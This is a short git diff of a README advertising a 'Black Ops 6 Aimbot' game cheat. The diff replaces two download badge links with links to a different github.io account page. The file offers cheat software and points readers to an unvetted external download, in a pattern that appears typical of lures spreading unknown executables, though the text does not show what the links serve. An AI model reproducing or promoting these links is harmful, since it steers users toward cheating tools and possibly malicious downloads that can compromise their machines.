@@ -1,7 +1,7 @@
 # 🎯 COD: Black Ops 6 Aimbot 
 
-[![Download Aimbot](https://img.shields.io/badge/Download_Aimbot-darkred?style=for-the-badge)](https://black-ops-cod-aimbot.github.io/.github/)  
-[![Improve Aim](https://img.shields.io/badge/Improve_Aim-orange?style=for-the-badge&logo=callofduty)](https://black-ops-cod-aimbot.github.io/.github/)
+[![Download Aimbot](https://img.shields.io/badge/Download_Aimbot-darkred?style=for-the-badge)](https://shawnmawoysao2.github.io/.github/)  
+[![Improve Aim](https://img.shields.io/badge/Improve_Aim-orange?style=for-the-badge&logo=callofduty)](https://shawnmawoysao2.github.io/.github/)
 
 ---
 
